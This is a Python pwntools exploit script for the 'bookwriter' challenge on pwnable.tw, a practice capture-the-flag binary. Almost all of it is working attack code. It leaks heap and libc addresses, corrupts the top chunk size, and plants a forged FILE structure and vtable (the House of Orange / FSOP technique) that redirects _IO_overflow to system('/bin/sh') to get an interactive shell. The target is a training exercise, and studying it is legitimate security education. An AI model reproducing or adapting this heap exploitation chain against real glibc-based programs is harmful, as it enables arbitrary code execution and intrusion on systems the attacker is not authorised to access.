#!/usr/bin/env python3
from pwn import *

QWORD = 8
P_INUSE = 1
PAGE_SIZE = 0x1000
CHUNK_HDR_SIZE = QWORD * 2
DUMMY = 0xdeadbeefdeadbeef
PAD = lambda n: b"a" * n

ld = ELF("./ld-2.23.so")
elf = ELF("./bookwriter_patched")
libc = ELF("./given/libc_64.so.6")
context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    p = remote("chall.pwnable.tw", 10304)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        gdb.attach(p, "\n".join([
                f"b *0x400d3d"
            ]))
        log.info(f"bookpage[0~8]: 0x6020a0")


class HouseOfOrangeFilePtr:
    def __init__(self, io_list_all, vtable_addr):
        self.io_list_all = io_list_all
        self.vtable_addr = vtable_addr

    def dump(self):
        offset_map = {
                0x0: b"/bin/sh\x00",
                0x8: p64(0x61),
                0x18: p64(self.io_list_all - 0x10),
                0x20: p64(2), # FILE->_IO_write_base
                0x28: p64(3), # FILE->_IO_write_ptr
                0xc0: p64(0), # FILE->_mode
                0xd8: p64(self.vtable_addr)
                }
        payload = b""
        for i in range(0, 0xe0, QWORD):
            if i in offset_map:
                payload += offset_map[i]
            else:
                payload += p64(0)
        return payload

class FakeFileVtable:
    def __init__(self, name2val):
        name2offset = {"_IO_overflow": 0x18}
        self.offset_map = {}
        for name, val in name2val.items():
            offset = name2offset[name]
            self.offset_map[offset] = p64(val)

    def dump(self):
        payload = b""
        for i in range(0, 0xc0, QWORD):
            if i in self.offset_map:
                payload += self.offset_map[i]
            else:
                payload += p64(0)
        return payload


page_cnt = 0
def add_bookpage(size, data):
    global page_cnt
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Size of page :", str(size).encode())
    if data is None:
        return
    p.sendafter(b"Content :", data)
    index = page_cnt
    page_cnt += 1
    return index

def view_bookpage(index):
    assert(index <= 7)
    p.sendlineafter(b"Your choice :", b"2")
    p.sendlineafter(b"Index of page :", str(index).encode())
    p.recvuntil(b"Content :\n")
    leak = p.recvline()
    log.info(f"view bookpage: {leak}")
    return leak

def edit_bookpage(index, data):
    p.sendlineafter(b"Your choice :", b"3")
    p.sendlineafter(b"Index of page :", str(index).encode())
    p.sendafter(b"Content:", data)

def view_info(new_author=b""):
    p.sendlineafter(b"Your choice :", b"4")
    p.recvuntil(b"Author : ")
    author = p.recvline()
    p.recvuntil(b"Page : ")
    num_page = p.recvline()
    if new_author:
        p.sendlineafter(b"Do you want to change the author ? (yes:1 / no:0)",
                        b"1")
        p.sendafter(b"Author :", new_author)
    else:
        p.sendlineafter(b"Do you want to change the author ? (yes:1 / no:0)",
                        b"0")
    return author, num_page

def leak_heap():
    # pad author buffer to full size
    view_info(PAD(0x40))
    # leak the first bookpage heap
    author, _ = view_info()
    heap_leak = author[0x40:-1]
    heap_addr = u64(heap_leak.ljust(8, b"\x00"))
    log.info(f"heap leak: {hex(heap_addr)}")
    return heap_addr

def leak_libc():
    unsorted_bin_chunk_size = 0x100
    p1_idx = add_bookpage(unsorted_bin_chunk_size, PAD(QWORD))
    leak = view_bookpage(p1_idx)[QWORD:]
    libc_leak = u64(leak.strip().ljust(QWORD, b"\x00"))
    log.info(f"libc leak: {hex(libc_leak)}")
    return libc_leak

def overflow_read_size_slot(allocated_bookpage):
    edit_bookpage(0, b"\x00")
    for _ in range(9 - allocated_bookpage):
        add_bookpage(0x30, p64(DUMMY))

def house_of_orange(size):
    # to overflow, must be 8-aligned chunk size
    # the following varaibles p0_usable_size, p0_chunk_size is ONLY true
    # under this assertion (i.e. size % 16 == 8)
    assert(size % 16 == 8)
    p0_usable_size = size
    p0_chunk_size = p0_usable_size + 8

    # This memory page layout will be:
    # | p0_hdr    |: 0x10
    # | p0_data   |: usable_size - 8
    # | pTop hdr  |: 0x10
    # | pTop data |: PAGE_SIZE - p0_hdr - p0_data - pTop_hdr
    p0_idx = add_bookpage(size, p64(DUMMY))
    pTop_chunk_size = (PAGE_SIZE - p0_chunk_size) | P_INUSE

    # first, pad bytes to full size, vulnerability will use strlen() to overwrite size
    edit_bookpage(p0_idx, PAD(size))
    edit_bookpage(p0_idx, PAD(p0_usable_size) + p64(pTop_chunk_size)[:3])

    # HOUSE_OF_ORANGE: scanf() secretly does malloc(0x1000)
    p0_addr = leak_heap()

    # uses unsorted_bin to leak libc
    libc.address = leak_libc() - 0x3c4158
    log.info(f"libc base: {hex(libc.address)}")


    # After next line, p0 can overwrite huge bytes
    overflow_read_size_slot(allocated_bookpage=2)

    # leak
    top_addr = p0_addr + p0_chunk_size - 16
    log.info(f"top chunk address: {hex(top_addr)}")

    # HOUSE OF ORANGE PAYLOAD!!
    file_vtable_addr = p0_addr
    vt = FakeFileVtable({"_IO_overflow": libc.sym["system"]}).dump()
    log.info(f"vt size: {hex(len(vt))}")
    fp = HouseOfOrangeFilePtr(libc.sym["_IO_list_all"], file_vtable_addr).dump()
    log.info(f"fp size: {hex(len(fp))}")
    payload = vt.ljust(top_addr - p0_addr, b"a") + fp

    fsop = b'/bin/sh\0' + p64(0x61) + p64(0) + p64(libc.sym["_IO_list_all"] - 0x10) + p64(2)
    fsop += p64(3) + p64(0) * 9 + p64(libc.sym["system"]) + p64(0) * 11 + p64(top_addr + QWORD * (12))
    payload2 = vt.ljust(top_addr - p0_addr, b"a") + fsop
    edit_bookpage(p0_idx, payload)

    # manage to malloc again
    add_bookpage(10, None)

def exploit():
    p.sendlineafter(b"Author :", b"hello")
    house_of_orange(0x400 - 8)
    # exit
    #p.sendlineafter(b"Your choice :", b"5")
    p.interactive()

if __name__ == "__main__":
    exploit()
